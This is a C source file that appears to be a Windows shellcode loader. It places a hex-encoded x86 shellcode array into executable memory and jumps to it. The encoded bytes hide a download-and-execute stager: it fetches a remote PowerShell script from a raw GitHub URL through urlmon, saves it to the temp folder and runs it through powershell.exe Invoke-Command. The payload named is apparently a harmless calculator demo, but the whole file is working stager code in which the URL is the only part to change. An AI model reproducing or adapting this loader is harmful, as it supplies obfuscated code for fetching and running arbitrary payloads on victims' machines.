#include <windows.h>
#include <stdio.h> 

char shellcode[] =

"\xe8\x00\x00\x00\x00\x5a\x8d\x52"
"\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8"
"\xc7\x00\x00\x00\x5a\x55\x52\x89"
"\xc5\x8d\xb2\x57\x02\x00\x00\x8d"
"\xba\x63\x02\x00\x00\xe8\xe7\x00"
"\x00\x00\x5a\x5d\x55\x52\x8d\x82"
"\x8b\x02\x00\x00\x50\xff\x92\x63"
"\x02\x00\x00\x5a\x5d\x55\x52\x89"
"\xc5\x8d\xb2\x6b\x02\x00\x00\x8d"
"\xba\x77\x02\x00\x00\xe8\xbf\x00"
"\x00\x00\x5a\x5d\x55\x52\x8d\x82"
"\x96\x02\x00\x00\x50\xff\x92\x63"
"\x02\x00\x00\x5a\x5d\x55\x52\x89"
"\xc5\x8d\xb2\x7f\x02\x00\x00\x8d"
"\xba\x87\x02\x00\x00\xe8\x97\x00"
"\x00\x00\x5a\x5d\x55\x52\x8d\x8a"
"\x2c\x02\x00\x00\x8d\xb2\x76\x01"
"\x00\x00\x31\xdb\x53\x53\x51\x56"
"\x53\xff\xb2\x87\x02\x00\x00\x58"
"\xff\xd0\x5a\x5d\x55\x52\x8d\xb2"
"\xc8\x01\x00\x00\x6a\x01\x56\xff"
"\x92\x67\x02\x00\x00\x5a\x5d\x55"
"\x52\x31\xf6\x31\xc9\x56\x68\x50"
"\x77\x6e\x64\x89\xe7\x56\x68\x59"
"\x65\x73\x73\x89\xe1\x56\x57\x51"
"\x56\xff\x92\x77\x02\x00\x00\x83"
"\xc4\x10\x5a\x5d\x56\xff\x92\x7b"
"\x02\x00\x00\xfc\x31\xff\x64\x8b"
"\x3d\x30\x00\x00\x00\x8b\x7f\x0c"
"\x8b\x7f\x14\x8b\x77\x28\x31\xd2"
"\x66\xad\x84\xc0\x74\x11\x3c\x41"
"\x72\x06\x3c\x5a\x77\x02\x0c\x20"
"\xc1\xc2\x07\x30\xc2\xeb\xe9\x39"
"\xda\x8b\x47\x10\x8b\x3f\x75\xdb"
"\xc3\x89\xea\x03\x52\x3c\x8b\x52"
"\x78\x01\xea\x8b\x5a\x20\x01\xeb"
"\x31\xc9\x57\x56\x8b\x36\x8b\x3b"
"\x01\xef\x52\x31\xd2\xc1\xc2\x07"
"\x32\x17\x47\x80\x3f\x00\x75\xf5"
"\x92\x5a\x39\xf0\x74\x0c\x83\xc3"
"\x04\x41\x39\x4a\x18\x75\xdf\x5e"
"\x5f\xc3\x5e\x5f\xad\x56\x53\x89"
"\xeb\x89\xde\x03\x5a\x24\x8d\x04"
"\x4b\x0f\xb7\x00\x8d\x04\x86\x03"
"\x42\x1c\x8b\x00\x01\xf0\xab\x5b"
"\x5e\x83\xc3\x04\x41\x81\x3e\xff"
"\xff\x00\x00\x75\xad\xc3\x68\x74"
"\x74\x70\x73\x3a\x2f\x2f\x72\x61"
"\x77\x2e\x67\x69\x74\x68\x75\x62"
"\x75\x73\x65\x72\x63\x6f\x6e\x74"
"\x65\x6e\x74\x2e\x63\x6f\x6d\x2f"
"\x6d\x69\x63\x61\x68\x66\x6c\x61"
"\x63\x6b\x2f\x73\x63\x72\x69\x70"
"\x74\x73\x2f\x6d\x61\x69\x6e\x2f"
"\x70\x6f\x77\x65\x72\x73\x68\x65"
"\x6c\x6c\x5f\x70\x6f\x70\x5f\x63"
"\x61\x6c\x63\x2e\x74\x78\x74\x00"
"\x70\x6f\x77\x65\x72\x73\x68\x65"
"\x6c\x6c\x2e\x65\x78\x65\x20\x49"
"\x6e\x76\x6f\x6b\x65\x2d\x43\x6f"
"\x6d\x6d\x61\x6e\x64\x20\x2d\x53"
"\x63\x72\x69\x70\x74\x42\x6c\x6f"
"\x63\x6b\x20\x28\x5b\x53\x63\x72"
"\x69\x70\x74\x42\x6c\x6f\x63\x6b"
"\x5d\x3a\x3a\x43\x72\x65\x61\x74"
"\x65\x28\x28\x47\x65\x74\x2d\x43"
"\x6f\x6e\x74\x65\x6e\x74\x20\x24"
"\x65\x6e\x76\x3a\x54\x45\x4d\x50"
"\x5c\x70\x61\x79\x6c\x6f\x61\x64"
"\x29\x29\x29\x00\x43\x3a\x5c\x55"
"\x73\x65\x72\x73\x5c\x6d\x66\x6c"
"\x61\x63\x6b\x5c\x41\x70\x70\x44"
"\x61\x74\x61\x5c\x4c\x6f\x63\x61"
"\x6c\x5c\x54\x65\x6d\x70\x5c\x70"
"\x61\x79\x6c\x6f\x61\x64\x00\x26"
"\x80\xac\xc8\xad\x6d\xbf\xe8\xff"
"\xff\x00\x00\x00\x00\x00\x00\x01"
"\x00\x00\x00\x0d\x68\xbc\xab\xbc"
"\xe6\xbe\xab\xff\xff\x00\x00\x02"
"\x00\x00\x00\x03\x00\x00\x00\x99"
"\x23\x5d\xd9\xff\xff\x00\x00\x04"
"\x00\x00\x00\x75\x73\x65\x72\x33"
"\x32\x2e\x64\x6c\x6c\x00\x75\x72"
"\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c"
"\x00";


int main(int argc, char **argv) {

	HINSTANCE hInstLib = LoadLibrary(TEXT("user32.dll"));
	
	int i = 0, len = 0, target_addy = 0, offset = 0x0;

	void*stage = VirtualAlloc(0, 0x1000, 0x1000,0x40 );

	printf("[*] Memory allocated: 0x%08x\n", stage);

	len = sizeof(shellcode);

	printf("[*] Size of Shellcode: %08x\n", len);

	memmove(stage, shellcode, 0x1000);

	printf("[*] Shellcode copied\n");

	target_addy = (char*)stage + offset;

	printf("[*] Adjusting offset: 0x%08x\n", target_addy);
	
	__asm {
		int 3

		mov eax, target_addy
		jmp eax
	}
}